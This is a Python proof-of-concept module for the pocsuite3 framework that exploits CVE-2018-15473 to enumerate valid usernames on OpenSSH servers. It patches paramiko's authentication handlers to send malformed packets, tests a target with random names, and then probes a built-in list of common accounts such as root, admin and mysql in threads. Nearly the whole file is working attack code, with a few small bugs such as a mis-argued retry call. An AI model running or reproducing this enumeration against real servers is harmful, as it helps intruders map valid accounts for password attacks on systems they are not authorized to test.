# -*- coding: utf-8 -*-
# author: seven

from pocsuite3.api import register_poc, POCBase, Output,logger,POC_CATEGORY
from pocsuite3.lib.core.threads import run_threads
import paramiko
import socket
import string
import sys
import json
import queue
from random import randint as rand
from random import choice as choice


task_queue = queue.Queue()
result_list = []
user_list = ['root','admin','superman','administrator','ftp','mysql','www-data']
# store function we will overwrite to malform the packet
old_parse_service_accept = paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT]

# list to store 3 random usernames (all ascii_lowercase characters); this extra step is added to check the target
# with these 3 random usernames (there is an almost 0 possibility that they can be real ones)
random_username_list = []
# populate the list
for i in range(3):
    user = "".join(choice(string.ascii_lowercase) for x in range(rand(15, 20)))
    random_username_list.append(user)

# create custom exception
class BadUsername(Exception):
    def __init__(self):
        pass

# create malicious "add_boolean" function to malform packet
def add_boolean(*args, **kwargs):
    pass

# create function to call when username was invalid
def call_error(*args, **kwargs):
    raise BadUsername()

# create the malicious function to overwrite MSG_SERVICE_ACCEPT handler
def malform_packet(*args, **kwargs):
    old_add_boolean = paramiko.message.Message.add_boolean
    paramiko.message.Message.add_boolean = add_boolean
    result  = old_parse_service_accept(*args, **kwargs)
    #return old add_boolean function so start_client will work again
    paramiko.message.Message.add_boolean = old_add_boolean
    return result

# create function to perform authentication with malformed packet and desired username
def checkUsername(host,port,username, tried=0):
    sock = socket.socket()
    sock.connect((host, port))
    # instantiate transport
    transport = paramiko.transport.Transport(sock)
    try:
        transport.start_client()
    except paramiko.ssh_exception.SSHException:
        # server was likely flooded, retry up to 3 times
        transport.close()
        if tried < 4:
            tried += 1
            return checkUsername(username, tried)
        else:
            print('[-] Failed to negotiate SSH transport')
    try:
        transport.auth_publickey(username, paramiko.RSAKey.generate(1024))
    except BadUsername:
            return (username, False)
    except paramiko.ssh_exception.AuthenticationException:
            return (username, True)
    #Successful auth(?)
    raise Exception("There was an error. Is this the correct version of OpenSSH?")

# function to test target system using the randomly generated usernames
def checkVulnerable(host,port):
    vulnerable = True
    random_username_list.append('root')
    for user in random_username_list:
        result = checkUsername(host,port,user)
        print(result)
        if result[1]:
            vulnerable = False
    return vulnerable



def exportList(results):
    final = ""
    for result in results:
        if result[1]:
            final+=result[0]+" is a valid user!\n"
        else:
            final+=result[0]+" is not a valid user!\n"
    return final

# assign functions to respective handlers
paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = malform_packet
paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = call_error


def check(host,port):
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        sock.connect((host,port))
        sock.close()
    except:
        logger.info('{}:{} not alive'.format(host,port))
        return False
    result = {}
    if not checkVulnerable(host,port):
        return False
    return True
    
class SSHEnumPOC(POCBase):
    vulID = 'CVE-2018-15473'
    version = '1.0'
    author = ['seven']
    vulDate = 'Jul 20, 2020'
    createDate = 'Jul 20, 2020'
    name = 'openssh enum'
    appName = 'openssh'
    appVersion = 'v1.0.0'
    category = POC_CATEGORY.TOOLS.CRACK
    protocol = POC_CATEGORY.PROTOCOL.SSH

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
    def _verify(self):
        host = self.getg_option("rhost")
        port = int(self.getg_option("rport")) or 8009
        result = {}
        if check(host,port):
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
        return self.parse_output(result)
    def _attack(self):
        host = self.getg_option("rhost")
        port = int(self.getg_option("rport")) or 8009
        result = {}
        if check(host,port):
            username_enum(host,port)
            if len(result_list)>0:
                usernames = ','.join(result_list)
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['Username'] = usernames
                result['extra'] = usernames
        return self.parse_output(result)
def task_init(host, port):
    for username in user_list:
        task_queue.put((host, port, username.strip()))


def task_thread():
    while not task_queue.empty():
        host, port, username = task_queue.get()
        logger.info('try burst {}:{} use username:{}'.format(
            host, port, username))
        result = checkUsername(host, port, username)
        if result[1]:
            # with task_queue.mutex:
            #     task_queue.queue.clear()
            logger.info(result[0])
            result_list.append(result[0])


def username_enum(host,port):
    try:
        task_init(host,port)
        run_threads(2,task_thread)
    except Exception:
        pass

register_poc(SSHEnumPOC)